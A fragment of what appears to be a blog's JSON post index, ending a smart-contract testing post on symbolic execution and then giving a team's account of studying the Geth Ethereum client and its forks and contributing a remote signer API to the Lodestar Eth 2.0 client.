stay tuned!Bonus: Symbolic executionSince we are talking about parameterization, one more thing I would briefly like to touch is symbolic execution. It weighs higher when compared with unit testing &amp; fuzzing. Symbolic execution is a way to brute-force a program to find multiple different paths of program execution. This is useful in a sense that identifies exactly what inputs cas failure or stop the execution &amp; what inputs actually cause the program to continue. It is important in terms of security as it outlines what undesired states the contract can get into.Here is the link for the github repo if you want to need a basic boilerplate.Wrap up!That’s all for now, I do plan to write an advanced tutorial using these tools i.e symbolic execution, fuzzing &amp; formal verification in the future. So, stay tuned!" }, { "title": "A Roller-Coaster Ride to Open-Source Contribution in Ethereum 2.0", "url": "/posts/ride-to-open-source-contribution/", "categories": "open-source, contribution", "tags": "open-source, eth 2.0, client, ethereum", "date": "2022-01-24 10:00:00 +0500", "snippet": "IntroductionI want to share our roller-coaster ride exploring the Ethereum client called Geth, written in Golang. At Novon, we have a dedicated and passionate team of developers &amp; researchers that aims towards helping &amp; contributing to existing blockchain infrastructures. We will be focusing on the development division in Novon, which is actively looking &amp; working on layer 0 to suggest improvements &amp; implement exciting features for the blockchain community to use. We made contribution on Eth 2.0 client Lodestar. Check it out!How did we get Started?Being in the blockchain space &amp; building exciting DApps over it for quite some time, we realized there is more to the blockchain. Having experience in the application layer, we wanted something more challenging to throw us out of our comfort zone. So we decided to move to the layer below it, layer 0.We immediately aimed to understand Geth (go-ethereum), an ethereum client written in Golang. It has been written by the awesome developers for more than six years &amp; is being maintained to date. It was a fascinating decision, but immediately we realized a challenge, learning ‘Golang.’ We did not have experience in that language before but keeping the principle in mind “Logics for all languages are approximately the same, the only hurdle is the syntax for that language” we quickly hopped over to golang to acquire a new language skillset. After a few articles, golang tour, &amp; youtube videos, we were ready to dive into the Geth codebase.For the developers looking at code that’s written over the course of six years with technical documentation, it’s challenging to get anywhere, especially with a massive codebase. At first, we looked at the organized folder names explaining each component of the geth, each folder containing tons of files &amp; links to different files. However, it was not possible to entirely go through each &amp; every folder, so we came up with the strategy for studying geth.We decided not to consider every file &amp; folder while exploring. It was to keep us focused &amp; not get overwhelmed, which worked out pretty well. We targeted the entry point of geth by having logs placed at many places within the code to run customized geth using our custom commands for our satisfaction. We considered using delve, an excellent debugger for golang to debug most parts of the geth.Look for more articles on how geth works at the core. I would like to thank Kelvin Fichter &amp; Optimism team for sharing their video on the internals of geth. It was a huge help. Folders of important blockchain components. Peer-to-peer network communication. How web3 actually works under the hood. Working of EVM interpreter. Block propagation &amp; consensus mechanism.One challenge was to work with the peer-to-peer side of things. Go debugger was not helpful in that regard. We manually had to figure out the working of p2p by deploying a local testnet &amp; by connecting peers (That’s a story for another day). We also wrote a guide on how to connect two local nodes of geth &amp; start your own custom blockchain—an article on that soon.Once we had these things figured out, it became super easy to understand the flow of the application. Another resource that helped us build an understanding around geth is this GitHub repo to connect the overall picture of geth.We documented each step &amp; realized any new developer stepping into this realm would face the exact same set of problems as we did. So we decided to write a guide exploring geth to enable easy onboarding of a developer to understand how exactly ethereum works at the core &amp; not waste any time by reinventing the wheel. Our team is actively working on this &amp; we will be sharing these articles soon.More Geth Forks?We had heard that there are many different EVM-based blockchains which are essentially all forks of geth. So we decided to take a look at that too. One blockchain that instantly comes to mind is the Binance smart chain (BSC); for our curiosity, we wanted to see what code has been changed &amp; to what extent, but we simply couldn’t compare the codebases &amp; see exactly what is going on. While tackling this, a thought hit my mind about there must be some software that compares two folders &amp; voila, we came across MeldMerge. It allows you to see the changes &amp; compare the folders file by file. It opened up a whole lot of possibilities for exploring other codebases. We immediately thought of Optimism, Arbitrum, Polygon (Matic) &amp; Binance smart chain. Our minds were flowing with excitement. We applied this tool to BSC and discovered a few changes &amp; their integration with the Binance chain, their genesis block configuration &amp; the reason why Binance is cheaper (fixed gas opcodes).Exciting Discovery!One of my teammates pointed out that if we run binance smart chain’s version of geth with the default parameters, it runs ethereum mainnet; interesting!. We thought this would apply to all forks but didn’t check them out.Another exciting thing was to discover the hardcoded addresses &amp; contract addresses after the DAO attack on ethereum in late 2017.The DecisionNow we had understood most of the things &amp; after a continuous learning period of 1 month, we decided to look for areas that could be improved within geth or features that could be implemented. We briefly looked at EIP-1559 implementation &amp; the frequency of updates &amp; patches to the geth repository. The devs were very active &amp; there was very little room for contribution as the software is being maintained by the developers having years of experience in Golang &amp; maintaining geth.We had two options to proceed.We enhance our golang skills &amp; look for contributions in geth or other forks of geth which seems promising.Eth 2.0 was just around the corner; since this is actively being evolved &amp; changes are frequently being made to Eth 2.0 specs the chances of contributing to that software were much higher &amp; the codebase is just three years old with a much better structure. And the community was very active.We decided to move on to the Eth 2.0 client &amp; continue releasing the articles on geth for easy onboarding of other developers trying to move into this space.Was it Futile to Learn Geth?I’d argue, No. This was a huge learning experience for all of us. It developed our mindset for open source contribution produced a sense of designing system architecture with a peer-to-peer network.It was a great opportunity for us to learn a new language &amp; apply it to a real-world application. It was also a chance to get in touch with relevant people in the space for queries &amp; suggestions.Next-Stop: LodestarEth 2.0 client is written in many different languages. We are experienced in Typescript. A client named Lodestar, is written by the amazing team at ChainSafe for over three years. Their documentation was super simple; all our newly learned p2p skills significantly made sense. Also, ChainSafe is involved more in layer 0 architecture development; some of their projects include a client for Eth 2.0 (Lodestar), Polkadot (Gossamer) &amp; Mina protocol, to name a few.We prepared ourselves to dive into another ocean of wonderful opportunities. Going through the code a lot quicker &amp; it immediately started to make sense. It didn’t take us long to grasp the basic flow of the application. A teammate of mine pointed out an open issue on Lodestar, which was related to implementing a “remote signer” API, which calls an external API to sign an attestation without storing a private key on the validator machine, as specified in EIP 3030. What do we do next? Create a Pull Request implementing this feature and it got recently merged! And that is how we made our first contribution to Eth2.0." } ]
